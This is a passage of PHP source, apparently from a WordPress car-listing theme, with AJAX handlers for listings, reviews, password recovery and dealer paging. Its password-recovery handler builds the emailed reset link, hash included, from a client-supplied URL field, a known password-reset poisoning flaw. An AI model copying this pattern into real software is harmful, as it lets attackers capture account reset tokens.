				$response['updated'] = stm_get_author_link($user_on) . '#stm_d_rev';


			}

		}


		$response = json_encode($response);
		echo $response;
		exit;
	}
}

add_action( 'wp_ajax_stm_submit_review', 'stm_submit_review' );
add_action( 'wp_ajax_nopriv_stm_submit_review', 'stm_submit_review' );


function stm_ajax_add_a_car() {
	$response = array();
	$first_step = array(); //needed fields
	$second_step = array(); //secondary fields
	$car_features = array(); //array of features car
	$videos = array(); /*videos links*/
	$notes = esc_html__('N/A', 'motors');
	$registered = '';
	$vin = '';
	$history = array(
		'label' => '',
		'link'  => ''
	);
	$location = array(
		'label' => '',
		'lat' => '',
		'lng' => '',
	);

	if(!is_user_logged_in()) {
		$response['message'] = esc_html__('Please, log in', 'motors');
		return false;
	} else {
		$user = stm_get_user_custom_fields('');
		$restrictions = stm_get_post_limits($user['user_id']);
	}


	$response['message'] = '';
	$error = false;

	$demo = stm_is_site_demo_mode();
	if($demo) {
		$error = true;
		$response['message'] = esc_html__( 'Site is on demo mode', 'motors' );
	}

	$update = false;
	if(!empty($_POST['stm_current_car_id'])) {
		$post_id = intval($_POST['stm_current_car_id']);
		$car_user = get_post_meta($post_id, 'stm_car_user', true);
		$update = true;

		/*Check if current user edits his car*/
		if(intval($car_user) != intval($user['user_id'])) {
			return false;
		}
	}

	/*Get first step*/
	if(!empty($_POST['stm_f_s'])) {
		foreach($_POST['stm_f_s'] as $post_key => $post_value) {
			if(!empty($_POST['stm_f_s'][$post_key])) {
				$first_step[ sanitize_title($post_key) ] = sanitize_title($_POST['stm_f_s'][ $post_key ]);
			}
		}
	}

	if(empty($first_step)) {
		$error = true;
		$response['message'] = esc_html__('Enter required fields', 'motors');
	}

	/*Get if no available posts*/
	if($restrictions['posts'] < 1 and !$update) {
		$error = true;
		$response['message'] = esc_html__('You do not have available posts', 'motors');
	}

	/*Getting second step*/
	foreach($_POST as $second_step_key => $second_step_value) {
		if(strpos($second_step_key, 'stm_s_s_') !== false) {
			if(!empty($_POST[$second_step_key])) {
				$original_key = str_replace('stm_s_s_', '', $second_step_key);
				$second_step[ sanitize_title($original_key) ] = sanitize_text_field($_POST[$second_step_key]);
			}
		}
	}

	/*Getting car features*/
	if(!empty($_POST['stm_car_features_labels'])) {
		foreach($_POST['stm_car_features_labels'] as $car_feature) {
			$car_features[] = esc_attr($car_feature);
		}
	}

	/*Videos*/
	if(!empty($_POST['stm_video'])) {
		foreach($_POST['stm_video'] as $video) {
			$videos[] = esc_url($video);
		}
	}

	/*Note*/
	if(!empty($_POST['stm_seller_notes'])) {
		$notes = esc_html($_POST['stm_seller_notes']);
	}

	/*Registration date*/
	if(!empty($_POST['stm_registered'])) {
		$registered = esc_attr($_POST['stm_registered']);
	}

	/*Vin*/
	if(!empty($_POST['stm_vin'])) {
		$vin = esc_attr($_POST['stm_vin']);
	}

	/*History*/
	if(!empty($_POST['stm_history_label'])) {
		$history['label'] = esc_attr($_POST['stm_history_label']);
	}

	if(!empty($_POST['stm_history_link'])) {
		$history['link'] = esc_url($_POST['stm_history_link']);
	}

	/*Location*/
	if(!empty($_POST['stm_location_text'])) {
		$location['label'] = esc_attr($_POST['stm_location_text']);
	}

	if(!empty($_POST['stm_lat'])) {
		$location['lat'] = esc_attr($_POST['stm_lat']);
	}

	if(!empty($_POST['stm_lng'])) {
		$location['lng'] = esc_attr($_POST['stm_lng']);
	}

	if(empty($_POST['stm_car_price'])) {
		$error = true;
		$response['message'] = esc_html__('Please add car price', 'motors');
	} else {
		$price = intval($_POST['stm_car_price']);
	}

	/*Generating post*/
	if(!$error) {

		$status = 'pending';

		if($restrictions['role'] == 'dealer') {
			$status = 'publish';
		}

		$post_data = array(
			'post_type' => 'listings',
			'post_title' => '',
			'post_content' => '',
			'post_status' => $status,
		);


		$post_data['post_content'] = '<div class="stm-car-listing-data-single stm-border-top-unit">';
		$post_data['post_content'] .= '<div class="title heading-font">'.esc_html__('Seller Note', 'motors').'</div></div>';
		$post_data['post_content'] .= $notes;

		foreach($first_step as $taxonomy => $title_part) {
			$term = get_term_by('slug', $title_part, $taxonomy);
			$post_data['post_title'] .= $term->name . ' ';
		}

		if(!$update) {
			$post_id = wp_insert_post( $post_data, true );
		}


		if(!is_wp_error($post_id)) {

			if($update) {
				$post_data_update = array(
					'ID' => $post_id,
					'post_content' => $post_data['post_content'],
					'post_status' => $status,
				);

				wp_update_post( $post_data_update );
			}

			update_post_meta($post_id, 'stock_number', $post_id);
			update_post_meta($post_id, 'stm_car_user', $user['user_id']);

			/*Set categories*/
			foreach($first_step as $tax=>$term) {
				wp_delete_object_term_relationships( $post_id, $tax );
				wp_add_object_terms( $post_id, $term, $tax, true );
				update_post_meta( $post_id, $tax, sanitize_title($term) );
			}

			if(!empty($second_step)) {
				/*Set categories*/
				foreach($second_step as $tax=>$term) {
					if(!empty($tax) and !empty($term)) {
						$tax_info = stm_get_all_by_slug($tax);
						if(!empty($tax_info['numeric']) and $tax_info['numeric']) {
							update_post_meta( $post_id, $tax, sanitize_text_field($term) );
						} else {
							wp_delete_object_term_relationships( $post_id, $tax );
							wp_add_object_terms( $post_id, $term, $tax, true );
							update_post_meta( $post_id, $tax, sanitize_text_field($term) );
						}
					}
				}
			}

			if(!empty($videos)) {
				update_post_meta($post_id, 'gallery_video', $videos[0]);

				if(count($videos) > 1) {
					array_shift( $videos );
					update_post_meta($post_id, 'gallery_videos', array_filter(array_unique($videos)));
				}

			}

			if(!empty($vin)) {
				update_post_meta($post_id, 'vin_number', $vin);
			}

			if(!empty($registered)) {
				update_post_meta($post_id, 'registration_date', $registered);
			}

			if(!empty($history['label'])) {
				update_post_meta($post_id, 'history', $history['label']);
			}

			if(!empty($history['link'])) {
				update_post_meta($post_id, 'history_link', $history['link']);
			}

			if(!empty($location['label'])) {
				update_post_meta($post_id, 'stm_car_location', $location['label']);
			}

			if(!empty($location['lat'])) {
				update_post_meta($post_id, 'stm_lat_car_admin', $location['lat']);
			}

			if(!empty($location['lng'])) {
				update_post_meta($post_id, 'stm_lng_car_admin', $location['lng']);
			}

			if(!empty($car_features)) {
				update_post_meta($post_id, 'additional_features', implode(',',$car_features));
			}


			update_post_meta($post_id, 'price', $price);

			update_post_meta($post_id, 'title', 'hide');
			update_post_meta($post_id, 'breadcrumbs', 'show');

			$response['post_id'] = $post_id;
			if(($update)) {
				$response['message'] = esc_html__( 'Car Updated, uploading photos', 'motors' );
			} else {
				$response['message'] = esc_html__( 'Car Added, uploading photos', 'motors' );
			}

		} else {
			$response['message'] = $post_id->get_error_message();
		}
	}

	$response = json_encode($response);
	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_ajax_add_a_car', 'stm_ajax_add_a_car' );
add_action( 'wp_ajax_nopriv_stm_ajax_add_a_car', 'stm_ajax_add_a_car' );


//Ajax filter cars remove unfiltered cars
function stm_restore_password() {

	$response            = array();

	$errors = array();

	if(empty($_POST['stm_user_login'])) {
		$errors['stm_user_login'] = true;
	} else {
		$username = $_POST['stm_user_login'];
	}

	$stm_link_send_to = '';

	if(!empty($_POST['stm_link_send_to'])) {
		$stm_link_send_to = esc_url($_POST['stm_link_send_to']);
	}

	$demo = stm_is_site_demo_mode();

	if($demo) {
		$errors['demo'] = true;
	}

	if(empty($errors)) {
		if ( filter_var( $username, FILTER_VALIDATE_EMAIL ) ) {
			$user = get_user_by( 'email', $username );
		} else {
			$user = get_user_by( 'login', $username );
		}

		if(!$user) {
			$response['message'] = esc_html__('User not found', 'motors');
		} else {
			$hash = stm_media_random_affix(20);
			$user_id = $user->ID;
			$stm_link_send_to = add_query_arg(array('user_id'=>$user_id, 'hash_check'=>$hash), $stm_link_send_to);
			update_user_meta($user_id, 'stm_lost_password_hash', $hash);

			/*Sending mail*/
			add_filter( 'wp_mail_content_type', 'stm_set_html_content_type' );

			$to      = $user->data->user_email;
			$subject = esc_html__( 'Password recovery', 'motors' );
			$body    = esc_html__( 'Please, follow the link, to set new password:', 'motors' ) . ' ' . $stm_link_send_to;

			wp_mail( $to, $subject, $body );

			remove_filter( 'wp_mail_content_type', 'stm_set_html_content_type' );

			$response['message'] = esc_html__('Instructions send on your email', 'motors');
		}

	} else {
		if($demo) {
			$response['message'] = esc_html__('Site is on demo mode.','motors');
		} else {
			$response['message'] = esc_html__( 'Please fill required fields', 'motors' );
		}
	}

	$response['errors'] = $errors;


	$response = json_encode( $response );

	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_restore_password', 'stm_restore_password' );
add_action( 'wp_ajax_nopriv_stm_restore_password', 'stm_restore_password' );


if(!function_exists('stm_report_review')) {
	function stm_report_review() {

		$response = array();

		if(!empty($_POST['id'])) {
			$report_id = intval( $_POST['id'] );

			$user_added_on = get_post_meta( $report_id, 'stm_review_added_on', true );
			if ( ! empty( $user_added_on ) ) {
				$user_added_on = get_user_by( 'id', $user_added_on );
			}

			$title = get_the_title( $report_id );

			if ( ! empty( $title ) and ! empty( $user_added_on ) ) {

				/*Sending mail */
				add_filter( 'wp_mail_content_type', 'stm_set_html_content_type' );

				$to      = array();
				$to[]    = get_bloginfo( 'admin_email' );
				$to[]    = $user_added_on->data->user_email;
				$subject = esc_html__( 'Report review', 'motors' );
				$body    = esc_html__( 'Review with id', 'motors' ) . ': "' . $report_id . '" ' . esc_html__( 'was reported', 'motors' ) . '<br/>';
				$body .= esc_html__( 'Review content', 'motors' ) . ': ' . get_post_field( 'post_content', $report_id );

				wp_mail( $to, $subject, $body );

				remove_filter( 'wp_mail_content_type', 'stm_set_html_content_type' );

				$response['message'] = esc_html__('Reported', 'motors');

			}
		}

		$response = json_encode( $response );

		echo $response;
		exit;
	}
}

add_action( 'wp_ajax_stm_report_review', 'stm_report_review' );
add_action( 'wp_ajax_nopriv_stm_report_review', 'stm_report_review' );


function stm_load_dealers_list() {
	$response = array();

	$per_page = 1;

	$remove_button = '';
	$new_offset = 0;

	if(!empty($_GET['offset'])) {
		$offset = intval($_GET['offset']);
	}

	if(!empty($offset)) {
		$dealers = stm_get_filtered_dealers($offset, $per_page);
		if($dealers['button'] == 'show') {
			$new_offset = $offset + $per_page;
		} else {
			$remove_button = 'hide';
		}
		if(!empty($dealers['user_list'])) {
			ob_start();
			$user_list = $dealers['user_list'];
			if(!empty($user_list)) {
				foreach ( $user_list as $user ) {
					stm_get_single_dealer( $user );
				}
			}
			$response['user_html'] = ob_get_clean();
		}
	}

	$response['remove'] = $remove_button;
	$response['new_offset'] = $new_offset;

	$response = json_encode($response);
	echo $response;
	exit;
}

add_action( 'wp_ajax_stm_load_dealers_list', 'stm_load_dealers_list' );
add_action( 'wp_ajax_nopriv_stm_load_dealers_list', 'stm_load_dealers_list' );